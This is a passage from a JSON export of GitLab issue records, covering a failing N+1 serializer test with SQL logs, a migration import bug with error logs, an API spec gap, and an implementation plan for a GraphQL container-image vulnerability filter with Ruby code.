FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 222 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"status\" = 2 AND \"deployments\".\"environment_id\" = 399 AND \"deployments\".\"deployable_id\" = 267 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       WITH RECURSIVE \"clusters_cte\" AS ((SELECT \"clusters\".*, NULL AS group_parent_id, 0 AS depth FROM \"clusters\" INNER JOIN \"cluster_projects\" ON \"cluster_projects\".\"cluster_id\" = \"clusters\".\"id\" INNER JOIN \"projects\" ON \"projects\".\"id\" = \"cluster_projects\".\"project_id\" WHERE \"clusters\".\"management_project_id\" = 371 AND \"clusters\".\"cluster_type\" = 3 AND \"projects\".\"namespace_id\" = 848)\n       UNION\n       (SELECT \"clusters\".*, \"projects\".\"namespace_id\" AS group_parent_id, 1 AS depth FROM \"projects\" LEFT OUTER JOIN \"cluster_projects\" ON \"cluster_projects\".\"project_id\" = \"projects\".\"id\" LEFT OUTER JOIN \"clusters\" ON \"clusters\".\"id\" = \"cluster_projects\".\"cluster_id\" WHERE \"projects\".\"id\" = 371)\n       UNION\n       (SELECT \"clusters\".*, \"namespaces\".\"parent_id\" AS group_parent_id, (\"clusters_cte\".\"depth\" + 1) FROM \"clusters_cte\", \"namespaces\" LEFT OUTER JOIN cluster_groups ON cluster_groups.group_id = namespaces.id LEFT OUTER JOIN clusters ON cluster_groups.cluster_id = clusters.id WHERE \"namespaces\".\"id\" = \"clusters_cte\".\"group_parent_id\")) SELECT \"clusters\".* FROM \"clusters_cte\" \"clusters\" WHERE \"clusters\".\"id\" IS NOT NULL AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment6') OR\n         'environment6' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY (CASE clusters.management_project_id\n         WHEN 371 THEN 0\n         ELSE depth\n       END) ASC\n       , CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment6' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"clusters\".* FROM \"clusters\" WHERE \"clusters\".\"cluster_type\" = 1 AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment6') OR\n         'environment6' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment6' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 269 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 269 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 224 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 269 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 269 LIMIT 1) LIMIT 1 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 224 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:ci*/\n\n       SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"status\" = 2 AND \"deployments\".\"environment_id\" = 400 AND \"deployments\".\"deployable_id\" = 269 /*application:test,correlation_id:a27d17caa722556ecd76382fbde6eae3,db_config_name:main*/\n     Shared Example Group: \"avoid N+1 on environments serialization\" called from ./ee/spec/serializers/ee/environment_serializer_spec.rb:17\n     # ./spec/support/shared_examples/serializers/environment_serializer_shared_examples.rb:22:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/spec_helper.rb:422:in `block (3 levels) in \u003ctop (required)\u003e'\n     # ./spec/support/sidekiq_middleware.rb:9:in `with_sidekiq_server_middleware'\n     # ./spec/spec_helper.rb:413:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/spec_helper.rb:409:in `block (3 levels) in \u003ctop (required)\u003e'\n     # ./lib/gitlab/application_context.rb:48:in `with_raw_context'\n     # ./spec/spec_helper.rb:409:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/spec_helper.rb:387:in `block (3 levels) in \u003ctop (required)\u003e'\n     # ./lib/gitlab/with_request_store.rb:17:in `enabling_request_store'\n     # ./lib/gitlab/with_request_store.rb:10:in `with_request_store'\n     # ./spec/spec_helper.rb:387:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/spec_helper.rb:267:in `block (2 levels) in \u003ctop (required)\u003e'\n     # ./spec/support/system_exit_detected.rb:7:in `block (2 levels) in \u003cmain\u003e'\n     # ./spec/support/database/prevent_cross_joins.rb:106:in `block (3 levels) in \u003cmain\u003e'\n     # ./spec/support/database/prevent_cross_joins.rb:60:in `with_cross_joins_prevented'\n     # ./spec/support/database/prevent_cross_joins.rb:106:in `block (2 levels) in \u003cmain\u003e'\n```","state":"closed","created_at":"2022-04-12T09:00:08.083Z","updated_at":"2022-07-25T05:45:49.149Z","closed_at":"2022-07-08T14:58:10.165Z","closed_by":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"labels":["Category:Environment Management","Next Up","Release::P2","backend","bug::performance","devops::release","group::release","missed-SLO","missed:15.0","priority::2","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"}],"author":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"type":"ISSUE","assignee":{"id":9253328,"username":"bala.kumar","name":"Bala Kumar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9253328/avatar.png","web_url":"https://gitlab.com/bala.kumar"},"user_notes_count":19,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358780","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358780","notes":"https://gitlab.com/api/v4/projects/278964/issues/358780/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358780/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358780","relative":"#358780","full":"gitlab-org/gitlab#358780"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106505929,"iid":358777,"project_id":278964,"title":"Add new inactive project params to application settings spec","description":"The following discussion from !84519 should be addressed:\n\n- [ ] @jprovaznik started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84519#note_909379092):  (+1 comment)\n\n    \u003e If we also expose these settings in API now, would it make sense to add these into GET/PUT tests in https://gitlab.com/gitlab-org/gitlab/blob/master/spec/requests/api/settings_spec.rb ?","state":"closed","created_at":"2022-04-12T07:53:38.429Z","updated_at":"2022-12-06T02:26:13.712Z","closed_at":"2022-08-19T17:11:13.920Z","closed_by":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"labels":["auto updated","backend","devops::manage","group::compliance","maintenance::test-gap","missed:15.0","missed:15.1","priority::3","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"}],"author":{"id":1642716,"username":"jprovaznik","name":"Jan Provaznik","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4577c0b60b7640100030d7ab267aba95?s=80\u0026d=identicon","web_url":"https://gitlab.com/jprovaznik"},"type":"ISSUE","assignee":{"id":9821577,"username":"huzaifaiftikhar1","name":"Huzaifa Iftikhar","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9821577/avatar.png","web_url":"https://gitlab.com/huzaifaiftikhar1"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358777","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358777","notes":"https://gitlab.com/api/v4/projects/278964/issues/358777/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358777/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358777","relative":"#358777","full":"gitlab-org/gitlab#358777"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106505210,"iid":358776,"project_id":278964,"title":"Inconsistent merge request comment import for Gitlab Migration","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nGitlab migration has inconsistent import of merge request comments and merge request status.\n\n* Event type comments like `added commit` are missing\n* Merge request status is sometimes inconsistent\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n* Issue can be reproduced by running migration of project: https://staging.gitlab.com/gitlab-migration/dri\n* Example of nightly pipeline which is reproducing the issue: https://gitlab.com/gitlab-org/manage/import/import-github-performance/-/jobs/2321876665\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n* https://staging.gitlab.com/gitlab-migration/dri\n* [2022-04-07_11-11-417_gitlab-migration_dri_export.tar.gz](/uploads/495da54bd867d40ae7953f6254d067c7/2022-04-07_11-11-417_gitlab-migration_dri_export.tar.gz)\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\n* Missing comments which are imported correctly by file based importer\n* Incorrect merge request status\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nAll data migrated correctly\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n```json\n{\"feature_category\":\"importers\",\"severity\":\"ERROR\",\"time\":\"2022-04-12T07:40:16.383Z\",\"correlation_id\":\"fcc73b45291503364fe35244419248aa\",\"bulk_import_id\":1,\"bulk_import_entity_id\":2,\"bulk_import_entity_type\":\"project_entity\",\"pipeline_class\":\"BulkImports::Projects::Pipelines::MergeRequestsPipeline\",\"pipeline_step\":\"loader\",\"exception_class\":\"ActiveRecord::RecordNotUnique\",\"exception_message\":\"PG::UniqueViolation: ERROR:  duplicate key value violates unique constraint \\\"index_merge_requests_on_target_project_id_and_iid\\\"\\nDETAIL:  Key (target_project_id, iid)=(2, 8) already exists.\\n\"},\n{\"feature_category\":\"importers\",\"severity\":\"ERROR\",\"time\":\"2022-04-12T07:40:18.007Z\",\"correlation_id\":\"fcc73b45291503364fe35244419248aa\",\"bulk_import_id\":1,\"bulk_import_entity_id\":2,\"bulk_import_entity_type\":\"project_entity\",\"pipeline_class\":\"BulkImports::Projects::Pipelines::MergeRequestsPipeline\",\"pipeline_step\":\"loader\",\"exception_class\":\"DiffNote::NoteDiffFileCreationError\",\"exception_message\":\"Failed to find diff file\"}\n```","state":"closed","created_at":"2022-04-12T07:43:30.638Z","updated_at":"2022-06-14T07:26:06.194Z","closed_at":"2022-06-13T08:18:13.139Z","closed_by":{"id":8551613,"username":"acunskis","name":"Andrejs Cunskis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8551613/avatar.png","web_url":"https://gitlab.com/acunskis"},"labels":["Importer:GitLab Migration","Next Up","backend","devops::manage","estimation::completed","group::import","section::dev","severity::3","type::bug","workflow::verification"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"}],"author":{"id":8551613,"username":"acunskis","name":"Andrejs Cunskis","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8551613/avatar.png","web_url":"https://gitlab.com/acunskis"},"type":"ISSUE","assignee":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"user_notes_count":22,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358776","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358776","notes":"https://gitlab.com/api/v4/projects/278964/issues/358776/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358776/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358776","relative":"#358776","full":"gitlab-org/gitlab#358776"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6629,"epic":{"id":335099,"iid":6629,"title":"ðŸž GitLab Migration bugs","url":"/groups/gitlab-org/-/epics/6629","group_id":9970},"iteration":null,"health_status":null},{"id":106494721,"iid":358763,"project_id":278964,"title":"GraphQL filter for vulnerabilities by container images with vulnerabilities","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\nTo support https://gitlab.com/gitlab-org/gitlab/-/issues/337883, we need a graphql query to get all images scanned.\n\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\n\n## Relevant links\n- [Original discussion on FE issue](https://gitlab.com/gitlab-org/gitlab/-/issues/337883#note_872432615)\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\n### Graphql Schema\n\n\u003cdetails\u003e\u003csummary\u003eProject\u003c/summary\u003e\n\n```graphql\nproject(fullPath: 'gitlab-org/gitlab') {\n  clusterAgents(hasVulnerabilities: true) { ... }\n  vulnerabilityContainerImages { ... }\n}\n```\n\n\u003c/details\u003e\n\n\u003cdetails\u003e\u003csummary\u003eGroup\u003c/summary\u003e\n\n```graphql\ngroup(fullPath: 'gitlab-org') {\n  clusterAgents(hasVulnerabilities: true) { ... }\n  vulnerabilityContainerImages { ... }\n}\n```\n\n\u003c/details\u003e\n\n\u003cdetails\u003e\u003csummary\u003eInstance Security Dashboard\u003c/summary\u003e\n\n```graphql\ninstanceSecurityDashboard\\ {\n  clusterAgents(hasVulnerabilities: true) { ... }\n  vulnerabilityContainerImages { ... }\n}\n```\n\n\u003c/details\u003e\n\n### Model Changes\n\n- [x] ~backend Add `distinct_container_images` scope to `Vulnerabilities::Read` model to select the distinct images:\n```ruby\nscope :distinct_container_images, -\u003e { where('location_image IS NOT NULL').distinct.select(:location_image).pluck(:location_image) }\n```\n\n- [x] ~backend Add `has_vulnerabilities` scope to `Clusters::Agent` model which checks if `cluster_agent_id` exists in `vulnerability_reads` table\n```ruby\nscope :has_vulnerabilities, -\u003e do\n  joins('inner join vulnerability_reads on cluster_agents.id = CAST(vulnerability_reads.cluster_agent_id AS INTEGER)')\n    .distinct\nend\n```\n\n- [x] ~backend Add 'for_projects` scope to `Clusters::Agents::ProjectAuthorization`\n```ruby\nscope :for_projects, -\u003e (project_ids) { where(project_id: project_ids) }\n```\n\n- [x] ~backend Add `cluster_agents` to `ee/app/models/ee/group.rb`\n```ruby\ndef cluster_agents\n  ::Clusters::Agents::GroupAuthorization.where(group: self)\nend\n```\n\n- [x] ~backend Add `cluster_agents` to `ee/app/models/instance_security_dashboard.rb`\n```ruby\ndef cluster_agents\n  return Clusters::Agent.none if projects.empty?\n\n  Clusters::Agents::ProjectAuthorization.for_projects(projects)\nend\n```\n\n### Resolver and graphql type changes\n\n- [x] ~backend Add `has_vulnerabilities` argument to `Resolvers::Clusters::AgentsResolver`\n```ruby\nargument :has_vulnerabilities, GraphQL::Types::Boolean,\n         required: false,\n         default_value: false,\n         description: 'Returns only the cluster agents which have atleast one vulnerability.'\n```\n\n- [x] ~backend Update `Clusters::AgentsFinder` to check if `has_vulnerabilities` argument is present and rename `project` to `object` so that it can take `group` or `instance_security_dashboard` :\n```diff\n module Clusters\n   class AgentsFinder\n-    def initialize(project, current_user, params: {})\n-      @project = project\n+    def initialize(object, current_user, params: {})\n+      @object = object\n       @current_user = current_user\n       @params = params\n     end\n \n     def execute\n-      return ::Clusters::Agent.none unless can_read_cluster_agents?\n+      return ::Clusters::Agent.none if object.is_a?(Project) \u0026\u0026 !can_read_cluster_agents?\n \n-      agents = project.cluster_agents\n+      agents = object.cluster_agents\n       agents = agents.with_name(params[:name]) if params[:name].present?\n+      agents = agents.has_vulnerabilities if params[:has_vulnerabilities].present?\n \n       agents.ordered_by_name\n     end\n \n     private\n \n-    attr_reader :project, :current_user, :params\n+    attr_reader :object, :current_user, :params\n \n     def can_read_cluster_agents?\n-      current_user.can?(:read_cluster, project)\n+      current_user.can?(:read_cluster, object)\n     end\n   end\n end\n```\n\n- [x] ~backend Update `ee/app/graphql/ee/types/group_type.rb`, `ee/app/graphql/ee/types/project_type.rb`, `ee/app/graphql/types/instance_security_dashboard_type.rb` to include :\n\n```ruby\nfield :cluster_agents,\n      ::Types::Clusters::AgentType.connection_type,\n      extras: [:lookahead],\n      null: true,\n      description: '...',\n      resolver: ::Resolvers::Clusters::AgentsResolver\n\nfield :vulnerability_container_images,\n      type: [GraphQL::Types::String],\n      null: true,\n      description: '...'\n\ndef vulnerability_container_images\n  object.vulnerability_reads.distinct_container_images\nend\n```\n\n\n\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\n\n\u003c!--\nWorkflow and other relevant labels\n\n# ~\"group::\" ~\"Category:\" ~\"GitLab Ultimate\"\nOther settings you might want to include when creating the issue.\n\n# /assign @\n# /epic \u0026\n--\u003e","state":"closed","created_at":"2022-04-12T02:53:18.533Z","updated_at":"2022-09-19T11:52:36.462Z","closed_at":"2022-08-30T20:26:51.204Z","closed_by":{"id":5535431,"username":"mparuszewski","name":"Alan (Maciej) Paruszewski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5535431/avatar.png","web_url":"https://gitlab.com/mparuszewski"},"labels":["backend","devops::govern","feature::enhancement","group::security policies","missed:15.2","section::sec","type::feature","workflow::in review"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[],"author":{"id":480804,"username":"thiagocsf","name":"Thiago FigueirÃ³","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/480804/avatar.png","web_url":"https://gitlab.com/thiagocsf"},"type":"ISSUE","assignee":null,"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/358763","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":15,"completed_count":8},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"8 of 15 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/358763","notes":"https://gitlab.com/api/v4/projects/278964/issues/358763/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/358763/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#358763","relative":"#358763","full":"gitlab-org/gitlab#358763"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7255,"epic":{"id":402570,"iid":7255,"title":"Project/Agent-level operational vulnerability report filters","url":"/groups/gitlab-org/-/epics/7255","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106489224,"iid":358745,"project_id":278964,"title":"ProjectAttributesPipeline should be flagged as NDJSON pipeline","description":"### Summary\n\nThe pipeline should be flagged as an NDJSON pipeline in order for the [BulkImports::PipelineWorker](https://gitlab.com/gitlab-org/gitlab/blob/b312c77641264588a5b2e3da78f6110927662e5a/lib/bulk_imports/projects/pipelines/project_attributes_pipeline.rb#L6) worker to keep 